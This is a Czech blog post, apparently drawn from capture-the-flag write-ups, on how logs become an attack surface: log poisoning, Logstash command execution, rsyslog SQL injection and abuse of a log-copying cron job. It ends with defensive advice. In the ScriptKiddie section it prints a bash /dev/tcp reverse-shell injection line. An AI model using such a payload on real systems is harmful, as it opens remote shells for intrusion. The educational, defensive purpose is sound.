---
layout: post
author: Tomáš Matějíček
title: "Logy jako útoková plocha"
date: 2020-12-02
tags: logs logstash rsyslog log-poisoning observability
---
## Úvod a kontext

Log se často bere jako pasivní důkazní stopa. Aplikace do něj zapisuje a administrátor si ho případně později přečte. Jenže v reálných systémech logy téměř nikdy nekončí na disku jako mrtvý text. Kopírují se mezi účty, parsují se, posílají do SQL, procházejí přes Logstash nebo jiný worker a někdy se z nich přímo odvozují další akce.

Právě tím se z logů stává útoková plocha. Ne proto, že by soubor `access.log` byl sám o sobě zranitelnost, ale proto, že vytváří hranici mezi:

- nízko-důvěryhodným producentem,
- a vysoce důvěryhodným konzumentem.

Haystack, Zetta, Tentacle a ScriptKiddie ukazují čtyři různé podoby stejného vzorce. Jednou log pipeline vykonává příkazy, podruhé bez escapování skládá SQL, potřetí se log adresář kopíruje do cizího homediru a počtvrté parser pod jiným uživatelem provede shell injection.

## Co dělá z logu skutečnou attack surface

### 1. Do logu může zapisovat útočník

To je základní podmínka. Útočník obvykle neovládá celý log soubor, ale ovládá:

- část HTTP požadavku,
- obsah zpracovávaného vstupu,
- syslog zprávu,
- nebo soubor v adresáři, který je považovaný za "logovou" cestu.

### 2. Někdo jiný log později čte s vyšší důvěrou

Právě tady se láme bezpečnostní význam. Následný konzument může být:

- shell script,
- Logstash pipeline,
- SQL sink,
- jiný uživatel,
- nebo automatizační job.

### 3. Konzument log nebere jako nedůvěryhodný vstup

Místo aby log:

- escapoval,
- validoval,
- nebo zpracoval jen jako data,

interpretuje ho jako příkaz, část SQL dotazu, shellový argument nebo autoritativní soubor.

## Jak tenhle vzorec vypadal v praxi

### ScriptKiddie: log poisoning přes soubor `hackers`

ScriptKiddie je velmi dobrý úvodní příklad. Účet `kid` mohl zapisovat do souboru `/home/kid/logs/hackers`. Samotný zápis by ještě nebyl problém. Rozhodující bylo, že jiný proces běžící pod účtem `pwn` tento soubor automaticky zpracovával tak, že vložený řetězec:

```text
;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/4444 0>&1'    #
```

vedl při dalším zpracování k vykonání příkazu.

To je klasický log poisoning, ale v praktické podobě: log není "jen text". Je to vstup do workflow běžícího pod jiným uživatelem.

### Haystack: Logstash pipeline jako příkazová fronta

Haystack ukazuje ještě nebezpečnější variantu. Root nepadl na další veřejné CVE, ale na tom, že Logstash workflow četlo `logstash_tm.log` a `logstash_tm2.log` a řádky `Ejecutar comando:` interpretovalo jako instrukce. Jakmile útočník mohl do těchto souborů psát, monitoring stack se změnil v root command runner.

To je důležitá lekce: log pipeline je plnohodnotná aplikace. Pokud z logu odvozuje akci místo toho, aby ho chápala jen jako data, dopad bývá stejný jako u command injection.

### Zetta: rsyslog, SQL template a injection do PostgreSQL

Zetta přidává infrastrukturnější variantu. Rsyslog posílal zprávy do PostgreSQL a SQL dotaz skládal přímo z obsahu log message. Jakmile šlo přes `logger -p local7.info ...` zapsat vlastní řetězec, vznikla SQL injection do logovacího backendu.

To je velmi důležitý případ, protože připomíná, že nebezpečí neleží jen v shell parseru. Stejně fatální může být i:

- SQL sink,
- templating,
- nebo jakýkoli jiný downstream systém, který očekává "bezpečný log".

### Tentacle: log adresář jako důvěryhodný zdroj pro cizí home

Tentacle ukazuje o něco méně intuitivní, ale velmi praktický vzorec. Cron job pod účtem `admin` pravidelně kopíroval obsah `/var/log/squid/` do `/home/admin/`:

```bash
/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
```

Útočník, který mohl do log adresáře zapisovat, tam vložil `.k5login`. Při dalším běhu jobu se z logové cesty stal autoritativní zdroj pro cizí domovský adresář a zkopírovaný soubor otevřel Kerberos login jako `admin`.

Tento případ je cenný hlavně proto, že nejde o "řádek v logu". Jde o širší princip: logová cesta sama o sobě nesmí být považovaná za důvěryhodný vstup pro privilegovanou automatiku.

## Co mají tyto případy společné

### 1. Nízká důvěra na vstupu, vysoká důvěra na výstupu

Útočník typicky ovládá jen malý kus vstupu:

- řádek,
- parametr,
- nebo soubor v logové cestě.

Na druhé straně ale stojí vysoce důvěryhodný konzument: root pipeline, jiný uživatel nebo SQL backend.

### 2. Log se stává mezivrstvou mezi rolemi

Jakmile log slouží jako:

- queue,
- export do databáze,
- mezisoubor mezi dvěma účty,
- nebo trigger pro další akci,

přestává být pasivní stopou a stává se komunikačním rozhraním.

### 3. Problém nebývá v logování samotném, ale v následném workflow

To je důležité i pro review. Samotný zápis do souboru ještě nemusí být chyba. Skutečný problém vzniká až tam, kde další komponenta:

- interpretuje obsah,
- skládá z něj příkaz,
- nebo ho zkopíruje do prostoru s vyšší důvěrou.

## Jak podobné chyby hledat po footholdu

Po prvním shellu dává smysl systematicky hledat:

- kdo zapisuje do jakých logů,
- kdo je později čte,
- jaké skripty nebo pipeline nad nimi běží,
- a zda logy nekončí v SQL, shellu nebo cizím homediru.

Prakticky se vyplatí ptát hlavně:

- existuje log processing job,
- používá `logger`, Logstash, rsyslog, vlastní parser nebo shell script,
- a pracuje s obsahem logu jako s daty, nebo jako s instrukcí?

## Jak si to nesplést s monitoringem obecně

Tento článek se přirozeně dotýká monitoring stacku, ale je užší než článek o observability platformách.

- Tam jde o platformu jako celek a její správní význam.
- Tady jde konkrétně o trust boundary mezi producentem logu a jeho zpracováním.

Haystack se proto objevuje v obou textech, ale pokaždé z jiného důvodu:

- jednou jako observability řetězec s vysokou důvěrou,
- podruhé jako příklad log pipeline, která interpretuje obsah jako příkaz.

## Obrana a bezpečnější návrh

### 1. Log brát vždy jako nedůvěryhodný vstup

Je jedno, jestli pochází z HTTP, syslogu nebo interního agenta. Jakmile do něj může nepřímo zasáhnout útočník, musí být zpracovaný jako nedůvěryhodná data.

### 2. Nikdy neskládat shell nebo SQL přímo z log zprávy

Log message nesmí bez escapování končit:

- v shell příkazu,
- v SQL template,
- ani v parseru, který z ní odvozuje akci.

### 3. Nekopírovat logové cesty do důvěryhodného prostoru bez filtrace

Tentacle dobře ukazuje, že problém není jen v obsahu řádku. Když se z logové cesty kopírují soubory do cizího home nebo jiného privilegovaného prostoru, musí se tvrdě filtrovat názvy i typy souborů.

### 4. Auditovat celý downstream tok

Bezpečné logování nekončí u aplikace. Je potřeba auditovat celý řetězec:

- collector,
- parser,
- transport,
- backend,
- i následné automatizační joby.

### 5. Monitorovat neobvyklé log payloady a soubory

Z detekčního pohledu je podezřelé:

- když se v logu objeví shell metaznaky,
- když syslog zprávy začnou rozbíjet SQL šablonu,
- nebo když se v log adresáři objeví skryté soubory typu `.k5login`.

## Shrnutí klíčových poznatků

- Logy jsou útoková plocha ve chvíli, kdy se z nich stane vstup do privilegovaného workflow.
- ScriptKiddie ukazuje shell injection přes parser, Haystack log pipeline jako command queue, Zetta SQL injection do logovacího backendu a Tentacle zneužití log adresáře jako důvěryhodného zdroje souborů.
- Samotné logování nebývá problém. Problém je až to, co další komponenta s logem dělá.

## Co si odnést do praxe

- Při review se neptejte jen "kam se log zapisuje". Ptejte se i "kdo ho pak čte, jak ho interpretuje a s jakými právy".
- Jakmile log nebo logová cesta přechází mezi různými rolemi, stává se z něj bezpečnostní hranice a musí se tak i navrhnout.
- Pokud monitoring nebo automatizace bere log jako příkaz, SQL fragment nebo autoritativní soubor, nejde už o pasivní observability vrstvu, ale o přímý exekuční kanál.
